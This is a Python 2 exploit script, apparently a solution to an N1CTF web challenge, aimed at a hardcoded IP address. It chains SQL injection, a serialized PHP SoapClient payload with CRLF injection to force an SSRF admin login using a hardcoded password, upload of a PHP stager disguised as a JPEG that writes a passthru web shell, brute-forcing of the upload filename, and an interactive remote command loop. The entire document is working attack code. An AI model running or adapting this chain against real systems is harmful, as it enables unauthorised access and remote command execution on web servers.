import re
import sys
import string
import random
import requests
import subprocess
from itertools import product

_target = 'http://47.97.221.96:23333/'
_action = _target + 'index.php?action='

def get_creds():
    username = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
    password = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
    return username, password

def solve_code(html):
    code = re.search(r'Code\(substr\(md5\(\?\), 0, 5\) === ([0-9a-f]{5})\)', html).group(1)
    solution = subprocess.check_output(['grep', '^'+code, 'captchas.txt']).split()[2]
    return solution

def register(username, password):
    resp = sess.get(_action+'register')
    code = solve_code(resp.text)
    sess.post(_action+'register', data={'username':username,'password':password,'code':code})
    return True

def login(username, password):
    resp = sess.get(_action+'login')
    code = solve_code(resp.text)
    sess.post(_action+'login', data={'username':username,'password':password,'code':code})
    return True

def publish(sig, mood):
    return sess.post(_action+'publish', data={'signature':sig,'mood':mood})#, proxies={'http':'127.0.0.1:8080'})

def get_prc_now():
    # date_default_timezone_set("PRC") is not important
    return subprocess.check_output(['php', '-r', 'date_default_timezone_set("PRC"); echo time();'])

def get_admin_session():
    sess = requests.Session()
    resp = sess.get(_action+'login')
    code = solve_code(resp.text)
    return sess.cookies.get_dict()['PHPSESSID'], code

def brute_filename(prefix, ts, sessid):
    ds = [''.join(i) for i in product(string.digits, repeat=3)]
    ds += [''.join(i) for i in product(string.digits, repeat=2)]
    # find uploaded file in max 1100 requests
    for d in ds:
        f = prefix + ts + d + '.jpg'
        resp = requests.get(_target+'adminpic/'+f, cookies={'PHPSESSID':sessid})
        if resp.status_code == 200:
            return f
    return False

print '[+] creating user session to trigger ssrf'
sess = requests.Session()

username, password = get_creds()

print '[+] register({}, {})'.format(username, password)
register(username, password)

print '[+] login({}, {})'.format(username, password)
login(username, password)

print '[+] user session => ' + sess.cookies.get_dict()['PHPSESSID']

print '[+] getting fresh session to be authenticated as admin'
phpsessid, code = get_admin_session()

ssrf = 'http://127.0.0.1/\x0d\x0aContent-Length:0\x0d\x0a\x0d\x0a\x0d\x0aPOST /index.php?action=login HTTP/1.1\x0d\x0aHost: 127.0.0.1\x0d\x0aCookie: PHPSESSID={}\x0d\x0aContent-Type: application/x-www-form-urlencoded\x0d\x0aContent-Length: 42\x0d\x0a\x0d\x0ausername=admin&password=nu1ladmin&code={}\x0d\x0a\x0d\x0aPOST /foo\x0d\x0a'.format(phpsessid, code)
mood = 'O:10:\"SoapClient\":4:{{s:3:\"uri\";s:{}:\"{}\";s:8:\"location\";s:39:\"http://127.0.0.1/index.php?action=login\";s:15:\"_stream_context\";i:0;s:13:\"_soap_version\";i:1;}}'.format(len(ssrf), ssrf)
mood = '0x'+''.join(map(lambda k: hex(ord(k))[2:].rjust(2, '0'), mood))

payload = 'a`, {}); -- -'.format(mood)

print '[+] final sqli/ssrf payload: ' + payload

print '[+] injecting payload through sqli'
resp = publish(payload, '0')

print '[+] triggering object deserialization -> ssrf'
sess.get(_action+'index')#, proxies={'http':'127.0.0.1:8080'})

print '[+] admin session => ' + phpsessid

# switching to admin session
sess = requests.Session()
sess.cookies = requests.utils.cookiejar_from_dict({'PHPSESSID': phpsessid})

print '[+] uploading stager'
shell = {'pic': ('kkk.jpg', '<?=$c=fopen("/app/wshell.php","w");fwrite($c,"<?=passthru(\$_GET[0]);?>");?>', 'image/jpeg')}
resp = sess.post(_action+'publish', files=shell)#, proxies={'http':'127.0.0.1:8080'})
prc_now = get_prc_now()[:-1]  # get epoch immediately

if 'upload ok' not in resp.text:
    print '[-] failed to upload shell, check admin session manually'
    sys.exit(0)

print '[+] bruteforcing uploaded file...'
stager = brute_filename('kkk', prc_now, phpsessid)

if not stager:
    print '[-] cannot find uploaded file, try again :('
    sys.exit(0)

print '[+] stager => {}../adminpic/{}'.format(_action, stager)
resp = sess.get(_action+'../adminpic/'+stager)

shell = _target+'wshell.php'
print '[+] shell => {}\n'.format(shell)

while True:
    cmd = raw_input('$ ').strip()
    if cmd == 'exit' or cmd == 'quit':
        break
    resp = requests.get('{}?0={}'.format(shell, cmd))
    print resp.text

# N1CTF{php_unserialize_ssrf_crlf_injection_is_easy:p}